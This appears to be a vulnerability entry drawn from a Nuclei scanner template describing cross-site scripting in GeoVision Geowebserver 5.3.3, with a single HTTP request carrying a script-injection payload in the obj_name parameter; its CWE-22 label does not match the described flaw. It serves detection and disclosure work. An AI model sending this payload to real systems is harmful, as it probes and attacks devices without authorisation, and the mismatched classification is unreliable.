# Vulnerability: GeoVision Geowebserver 5.3.3 - Cross-Site Scripting
**Classification:** CWE-22
**Source:** Nuclei Template (`geovision-geowebserver-xss.yaml`)

## Description
GeoVision Geowebserver 5.3.3 and prior versions are vulnerable to several cross-site scripting / HTML injection / local file inclusion / XML injection / code execution vectors because the application fails to properly sanitize user requests.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /Visitor/bin/WebStrings.srf?file=&obj_name=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}
Accept: */*
```

